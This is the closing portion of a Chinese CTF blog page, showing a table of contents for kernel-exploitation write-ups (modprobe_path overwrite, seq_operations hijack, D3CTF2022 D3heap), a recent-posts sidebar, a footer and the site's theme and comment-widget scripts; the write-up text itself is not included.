href="#Analysis-%E8%A7%A3%E6%B3%95%E4%B8%80-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99modprode-path"><span class="toc-number">2.5.</span> <span class="toc-text">Analysis.解法一:任意地址写modprode_path</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-%E8%A7%A3%E6%B3%95%E4%BA%8C-%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.</span> <span class="toc-text">Analysis.解法二:劫持控制流提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PLAN1-%E9%A2%98%E7%9B%AE%E6%8F%90%E4%BE%9B%E7%9A%84%E5%86%99%E6%93%8D%E4%BD%9C"><span class="toc-number">2.6.1.</span> <span class="toc-text">PLAN1.题目提供的写操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#seq-operations%E7%BB%93%E6%9E%84%E4%BD%93%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="toc-number">2.6.1.1.</span> <span class="toc-text">seq_operations结构体劫持控制流</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pt-regs%E7%BB%93%E6%9E%84%E5%B8%83%E7%BD%AEROP"><span class="toc-number">2.6.1.2.</span> <span class="toc-text">利用pt_regs结构布置ROP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8setxattr%E8%BF%9B%E8%A1%8C%E5%86%99"><span class="toc-number">2.6.2.</span> <span class="toc-text">利用setxattr进行写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8sk-buff%E8%BF%9B%E8%A1%8C%E5%86%99"><span class="toc-number">2.6.3.</span> <span class="toc-text">利用sk_buff进行写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#D3CTF2022-D3heap"><span class="toc-number">3.</span> <span class="toc-text">[D3CTF2022]D3heap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/HITCONCTF-2023/" title="HITCONCTF-2023"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HITCONCTF-2023"/></a><div class="content"><a class="title" href="/2023/09/11/HITCONCTF-2023/" title="HITCONCTF-2023">HITCONCTF-2023</a><time datetime="2023-09-11T04:39:49.000Z" title="Created 2023-09-11 12:39:49">2023-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/06/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="近期比赛复现"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="近期比赛复现"/></a><div class="content"><a class="title" href="/2023/09/06/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="近期比赛复现">近期比赛复现</a><time datetime="2023-09-06T12:01:22.000Z" title="Created 2023-09-06 20:01:22">2023-09-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/" title="WriteUps for some problems in SekaiCTF-2023"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WriteUps for some problems in SekaiCTF-2023"/></a><div class="content"><a class="title" href="/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/" title="WriteUps for some problems in SekaiCTF-2023">WriteUps for some problems in SekaiCTF-2023</a><time datetime="2023-08-29T03:54:14.000Z" title="Created 2023-08-29 11:54:14">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/" title="CVE-2016-9793分析"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2016-9793分析"/></a><div class="content"><a class="title" href="/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/" title="CVE-2016-9793分析">CVE-2016-9793分析</a><time datetime="2023-04-19T08:27:13.000Z" title="Created 2023-04-19 16:27:13">2023-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/17/ucore-lab/" title="ucore-lab"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ucore-lab"/></a><div class="content"><a class="title" href="/2023/04/17/ucore-lab/" title="ucore-lab">ucore-lab</a><time datetime="2023-04-17T07:04:17.000Z" title="Created 2023-04-17 15:04:17">2023-04-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Photon</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a><br>
<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
<a href="https://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">皖ICP备2022000759号</a></div><div class="footer_custom_text">欢迎来到光子的博客哟(●'◡'●)</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'J3nDf4qkr8OdRFaP64k2k453-gzGzoHsz',
      appKey: 'NXx6F7OYpwVWFbIQPVnw8HvN',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>